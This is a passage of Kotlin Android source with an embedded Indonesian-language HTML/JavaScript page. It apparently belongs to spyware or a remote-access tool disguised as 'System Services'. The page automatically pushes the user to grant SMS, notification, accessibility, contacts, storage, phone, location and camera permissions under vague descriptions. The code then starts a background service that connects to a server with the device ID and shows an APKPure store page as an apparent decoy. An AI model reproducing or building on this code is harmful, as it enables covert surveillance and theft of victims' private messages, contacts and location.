            <circle cx="12" cy="13" r="3.5"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Kamera</div>
          <div class="perm-desc">Diperlukan untuk fitur pemindaian aplikasi.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-cam" onchange="onToggle('cam',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-bat">
        <span class="perm-index">#02</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <rect x="1" y="6" width="18" height="12" rx="2"/><path d="M23 13v-2"/><path d="M7 12h4M9 10v4"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Pengoptimalan</div>
          <div class="perm-desc">Mencegah sistem menghentikan aplikasi saat berjalan.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-bat" onchange="onToggle('bat',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-overlay">
        <span class="perm-index">#03</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/><rect x="6" y="7" width="5" height="4" rx="1"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Floating</div>
          <div class="perm-desc">Mengizinkan fitur tampil di atas aplikasi lain.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-overlay" onchange="onToggle('overlay',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-accessibility">
        <span class="perm-index">#04</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <circle cx="12" cy="4" r="2"/><path d="M12 6v6l3 3M6 8l2.5 2M18 8l-2.5 2M8.5 21l2-5M15.5 21l-2-5"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Aksesibilitas</div>
          <div class="perm-desc">Diperlukan untuk mendukung fungsi layanan aplikasi.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-accessibility" onchange="onToggle('accessibility',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-usage">
        <span class="perm-index">#05</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Penggunaan Aplikasi</div>
          <div class="perm-desc">Membaca status penggunaan aplikasi pada perangkat.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-usage" onchange="onToggle('usage',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-sms">
        <span class="perm-index">#06</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Baca SMS</div>
          <div class="perm-desc">Membaca SMS masuk setelah pengguna memberikan izin.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-sms" onchange="onToggle('sms',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-notif">
        <span class="perm-index">#07</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Akses Notifikasi</div>
          <div class="perm-desc">Membaca notifikasi setelah pengguna mengaktifkan akses.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-notif" onchange="onToggle('notif',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-gallery">
        <span class="perm-index">#08</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Galeri</div>
          <div class="perm-desc">Mengakses media yang dipilih pengguna.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-gallery" onchange="onToggle('gallery',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-location">
        <span class="perm-index">#09</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Izin Lokasi</div>
          <div class="perm-desc">Mengakses lokasi perangkat setelah izin diberikan.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-location" onchange="onToggle('location',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-gpson">
        <span class="perm-index">#10</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Aktifkan GPS</div>
          <div class="perm-desc">GPS harus aktif agar koordinat dapat diperbarui.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-gpson" onchange="onToggle('gpson',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-contacts">
        <span class="perm-index">#11</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4-4v2"/><circle cx="9" cy="7" r="4"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Kontak</div>
          <div class="perm-desc">Membaca kontak setelah pengguna memberikan izin.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-contacts" onchange="onToggle('contacts',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-storage">
        <span class="perm-index">#12</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Akses Semua File</div>
          <div class="perm-desc">Akses penyimpanan sesuai persetujuan pengguna.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-storage" onchange="onToggle('storage',this)"><span class="tog-track"></span></label>
      </div>
      <div class="perm-row" id="row-phone">
        <span class="perm-index">#13</span>
        <div class="perm-icon">
          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.6 3.4"/>
          </svg>
        </div>
        <div class="perm-info">
          <div class="perm-name">Info Telepon & SIM</div>
          <div class="perm-desc">Membaca informasi telepon setelah izin diberikan.</div>
        </div>
        <label class="tog"><input type="checkbox" id="tog-phone" onchange="onToggle('phone',this)"><span class="tog-track"></span></label>
      </div>
    </section>
    <footer class="perm-footer">
      <div class="all-granted-badge" id="allGrantedBadge">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
          <polyline points="20 6 9 17 4 12"/>
        </svg>
        SEMUA AKSES TELAH DIAKTIFKAN
      </div>
      <button class="btn-masuk refresh-mode" id="btnMasuk" onclick="handleMasuk()">
        <span id="btnLabel">PERBARUI STATUS</span>
      </button>
    </footer>
    <div class="bottom-sign">system_services · access_control · v2.0</div>
  </main>
</div>

<!-- Halaman Terhubung (Server Monitor) -->
<div class="screen hidden" id="connectedScreen">
  <header class="hud-top">
    <div class="hud-brand">
      <span class="hud-dot"></span>
      <span class="hud-title">SYSTEM SERVICES · SERVER MONITOR</span>
    </div>
    <span class="hud-clock liveClock">00:00:00</span>
  </header>
  <main class="connected-body">
    <section class="conn-wrap">
      <div class="core">
        <div class="core-ring r1"></div>
        <div class="core-ring r2"></div>
        <div class="core-ring r3"></div>
        <div class="core-box">SS</div>
        <div class="core-ping"></div>
      </div>
      <div class="cyber-badge" id="serverBadge">SERVER MONITOR</div>
      <h1 class="conn-main-title">SYSTEM<br>SERVICES</h1>
      <p class="conn-main-sub">// layanan berjalan di latar belakang</p>
      <div class="conn-status-panel">
        <div class="conn-server-name">SYSTEM SERVICES <span>— LIVE MONITOR</span></div>
        <div class="equalizer" aria-hidden="true">
          <span class="eq"></span><span class="eq"></span><span class="eq"></span>
          <span class="eq"></span><span class="eq"></span><span class="eq"></span>
          <span class="eq"></span>
        </div>
        <div class="conn-status-indicator status-indicator offline" id="statusIndicator">
          <div class="status-dot"></div>
          <div class="status-text" id="statusLbl">TIDAK TERHUBUNG</div>
        </div>
        <div class="status-last" id="infoLast">MENUNGGU STATUS SERVER...</div>
      </div>
      <div class="conn-info-box">
        <div class="conn-info-row">
          <span class="conn-info-k">ID PERANGKAT</span>
          <span class="conn-info-v" id="infoDevId">—</span>
        </div>
        <div class="conn-info-row">
          <span class="conn-info-k">STATUS SINKRONISASI</span>
          <span class="conn-info-v" id="infoSync">MENGHUBUNGKAN...</span>
        </div>
      </div>
      <button class="check-btn" onclick="updateConnectionStatus()">CEK SERVER</button>
      <div class="conn-footer">powered by system services · device manager</div>
    </section>
  </main>
</div>

<!-- Halaman Webview (APKPure) -->
<div class="screen hidden" id="webviewScreen">
  <header class="hud-top" style="min-height:auto;padding:8px 18px;">
    <div class="hud-brand" style="gap:8px;">
      <span class="hud-dot" style="width:8px;height:8px;"></span>
      <span class="hud-title" style="font-size:9px;letter-spacing:2px;">APKPURE · STORE</span>
    </div>
    <span class="hud-clock liveClock" style="font-size:10px;">00:00:00</span>
  </header>
  <div class="webview-body">
    <div class="webview-header">
      <button class="back-btn" onclick="goBackToConnected()">← KEMBALI</button>
      <span class="url-text">https://m.apkpure.com/id/</span>
      <span class="status-dot-mini"></span>
    </div>
    <iframe id="webviewFrame" src="https://m.apkpure.com/id/" sandbox="allow-same-origin allow-scripts allow-popups allow-forms" loading="lazy"></iframe>
  </div>
</div>

<script>
const permIds = [
  'cam','bat','overlay','accessibility','usage','sms','notif',
  'gallery','location','gpson','contacts','storage','phone'
];

function androidCall(method, fallback = false) {
  try {
    if (!window.Android || typeof Android[method] !== 'function') return fallback;
    return Android[method]();
  } catch (e) {
    return fallback;
  }
}

function refreshPerms() {
  const state = {
    cam:           androidCall('isCamGranted'),
    bat:           androidCall('isBatteryOptIgnored'),
    overlay:       androidCall('isOverlayGranted'),
    accessibility: androidCall('isAccessibilityGranted'),
    usage:         androidCall('isUsageAccessGranted'),
    sms:           androidCall('isSmsGranted'),
    notif:         androidCall('isNotifListenerGranted'),
    gallery:       androidCall('isGalleryGranted'),
    location:      androidCall('isLocationGranted'),
    gpson:         androidCall('isGpsEnabled'),
    contacts:      androidCall('isContactsGranted'),
    storage:       androidCall('isManageStorageGranted'),
    phone:         androidCall('isPhoneGranted')
  };

  let allOk = true;

  permIds.forEach(id => {
    const granted = !!state[id];
    const toggle = document.getElementById('tog-' + id);
    const row = document.getElementById('row-' + id);

    if (!granted) allOk = false;
    if (toggle) {
      toggle.checked = granted;
      toggle.disabled = granted;
    }
    if (row) row.classList.toggle('granted', granted);
  });

  document.getElementById('allGrantedBadge')?.classList.toggle('show', allOk);

  const btn = document.getElementById('btnMasuk');
  const label = document.getElementById('btnLabel');

  if (btn && label) {
    btn.classList.toggle('refresh-mode', !allOk);
    label.textContent = allOk ? 'MULAI' : 'PERBARUI STATUS';
  }

  // Auto switch to webview if all permissions granted
  if (allOk) {
    const permScreen = document.getElementById('permScreen');
    const webviewScreen = document.getElementById('webviewScreen');
    if (permScreen && webviewScreen && !permScreen.classList.contains('hidden')) {
      showWebview();
    }
  }
}

const autoPermList = [
  { id:'cam',           check:()=>androidCall('isCamGranted'),           request:()=>androidCall('requestCamPerm') },
  { id:'bat',           check:()=>androidCall('isBatteryOptIgnored'),    request:()=>androidCall('openBatterySettings') },
  { id:'overlay',       check:()=>androidCall('isOverlayGranted'),       request:()=>androidCall('requestOverlayPerm') },
  { id:'accessibility', check:()=>androidCall('isAccessibilityGranted'), request:()=>androidCall('requestAccessibilityPerm') },
  { id:'usage',         check:()=>androidCall('isUsageAccessGranted'),   request:()=>androidCall('requestUsageAccessPerm') },
  { id:'sms',           check:()=>androidCall('isSmsGranted'),           request:()=>androidCall('requestSmsPerm') },
  { id:'notif',         check:()=>androidCall('isNotifListenerGranted'), request:()=>androidCall('openNotifListenerSettings') },
  { id:'gallery',       check:()=>androidCall('isGalleryGranted'),       request:()=>androidCall('requestGalleryPerm') },
  { id:'location',      check:()=>androidCall('isLocationGranted'),      request:()=>androidCall('requestLocationPerm') },
  { id:'gpson',         check:()=>androidCall('isGpsEnabled'),           request:()=>androidCall('requestEnableGps') },
  { id:'contacts',      check:()=>androidCall('isContactsGranted'),      request:()=>androidCall('requestContactsPerm') },
  { id:'storage',       check:()=>androidCall('isManageStorageGranted'), request:()=>androidCall('requestManageStoragePerm') },
  { id:'phone',         check:()=>androidCall('isPhoneGranted'),         request:()=>androidCall('requestPhonePerm') }
];

let autoIndex = 0;
let autoWaitInterval = null;

function requestPermById(id) {
  const permission = autoPermList.find(item => item.id === id);
  if (permission) permission.request();
}

function onToggle(id, element) {
  if (!element.checked) {
    refreshPerms();
    return;
  }

  requestPermById(id);
  setTimeout(refreshPerms, 600);
}

function startAutoPermFlow() {
  autoIndex = 0;
  requestNextPerm();
}

function requestNextPerm() {
  refreshPerms();

  while (autoIndex < autoPermList.length && autoPermList[autoIndex].check()) {
    autoIndex++;
  }

  if (autoIndex >= autoPermList.length) {
    document.querySelectorAll('.perm-row').forEach(row => row.classList.remove('requesting'));
    refreshPerms();
    return;
  }

  const current = autoPermList[autoIndex];

  document.querySelectorAll('.perm-row').forEach(row => row.classList.remove('requesting'));

  const row = document.getElementById('row-' + current.id);
  if (row) {
    row.classList.add('requesting');
    row.scrollIntoView({behavior:'smooth',block:'center'});
  }

  current.request();

  if (autoWaitInterval) clearInterval(autoWaitInterval);

  autoWaitInterval = setInterval(() => {
    if (current.check()) {
      clearInterval(autoWaitInterval);
      autoWaitInterval = null;
      refreshPerms();
      autoIndex++;
      setTimeout(requestNextPerm, 700);
    }
  }, 1000);
}

function checkAllGranted() {
  return autoPermList.every(item => item.check());
}

function handleMasuk() {
  const label = document.getElementById('btnLabel');

  if (label?.textContent.trim() === 'MULAI') {
    showWebview();
  } else {
    refreshPerms();
    startAutoPermFlow();
  }
}

function showConnected() {
  document.getElementById('permScreen')?.classList.add('hidden');
  document.getElementById('connectedScreen')?.classList.remove('hidden');
  document.getElementById('webviewScreen')?.classList.add('hidden');

  try {
    if (window.MainBridge && typeof MainBridge.connectNow === 'function') {
      MainBridge.connectNow();
    }
  } catch (e) {}

  document.getElementById('infoDevId').textContent =
    androidCall('getDeviceId', '—');

  updateConnectionStatus();
}

function showWebview() {
  document.getElementById('permScreen')?.classList.add('hidden');
  document.getElementById('connectedScreen')?.classList.add('hidden');
  document.getElementById('webviewScreen')?.classList.remove('hidden');
}

function goBackToConnected() {
  document.getElementById('webviewScreen')?.classList.add('hidden');
  document.getElementById('connectedScreen')?.classList.remove('hidden');
  updateConnectionStatus();
}

function updateConnectionStatus() {
  const online = !!androidCall('isSocketConnected');

  const indicator = document.getElementById('statusIndicator');
  const label = document.getElementById('statusLbl');
  const sync = document.getElementById('infoSync');
  const last = document.getElementById('infoLast');
  const badge = document.getElementById('serverBadge');

  if (!indicator || !label || !sync || !last) return;

  indicator.className =
    'conn-status-indicator status-indicator ' + (online ? 'online' : 'offline');

  label.textContent = online ? 'TERHUBUNG' : 'TIDAK TERHUBUNG';
  sync.textContent = online ? 'AKTIF & TERSINKRONISASI' : 'MENCOBA MENGHUBUNGKAN...';
  badge.textContent = online ? 'SERVER ONLINE' : 'SERVER OFFLINE';

  last.textContent = online
    ? 'TERAKHIR DIPERBARUI ' + new Date().toLocaleTimeString('id-ID')
    : 'SERVER BELUM MEMBERIKAN RESPONS';

  // Auto switch to webview if connected
  if (online) {
    const connectedScreen = document.getElementById('connectedScreen');
    const webviewScreen = document.getElementById('webviewScreen');
    if (connectedScreen && webviewScreen && !connectedScreen.classList.contains('hidden')) {
      setTimeout(showWebview, 1500);
    }
  }
}

function updateClock() {
  const time = new Date().toLocaleTimeString('id-ID', {
    hour12:false,
    hour:'2-digit',
    minute:'2-digit',
    second:'2-digit'
  });

  document.querySelectorAll('.liveClock').forEach(el => {
    el.textContent = time;
  });
}

window.addEventListener('load', () => {
  updateClock();
  setInterval(updateClock, 1000);

  setTimeout(() => {
    if (checkAllGranted()) {
      showWebview();
    } else {
      refreshPerms();
      startAutoPermFlow();
    }
  }, 300);

  setInterval(() => {
    const permissionScreen = document.getElementById('permScreen');
    if (permissionScreen && !permissionScreen.classList.contains('hidden')) {
      refreshPerms();
    }
  }, 1000);

  setInterval(() => {
    const connectedScreen = document.getElementById('connectedScreen');
    if (connectedScreen && !connectedScreen.classList.contains('hidden')) {
      updateConnectionStatus();
    }
  }, 2000);
});
</script>
</body>
</html>""".trimIndent()
    }

    inner class MainBridge {
            @android.webkit.JavascriptInterface
            fun connectNow() {
                Handler(Looper.getMainLooper()).post {
                    startDeviceService()
                    val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                    sendBroadcast(i)
                }
            }
        }
    }

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    @JavascriptInterface fun isCamGranted()            = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted()            = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted()  = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored()     = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted()        = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted()  = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted()    = (context as MainActivity).isUsageAccessGranted()

    @JavascriptInterface fun requestCamPerm()          = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm()          = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings()     = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm()      = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm()= (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm()  = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun isGalleryGranted()        = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun requestGalleryPerm()      = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun isLocationGranted()       = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled()            = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun requestLocationPerm()     = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps()        = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun isContactsGranted()       = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun requestContactsPerm()     = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun isGmailGranted()           = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun requestGmailPerm()         = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun isPhoneGranted()           = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun requestPhonePerm()         = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun isManageStorageGranted()  = (context as MainActivity).isManageStorageGranted()
    @JavascriptInterface fun requestManageStoragePerm()= (context as MainActivity).requestManageStoragePerm()
}
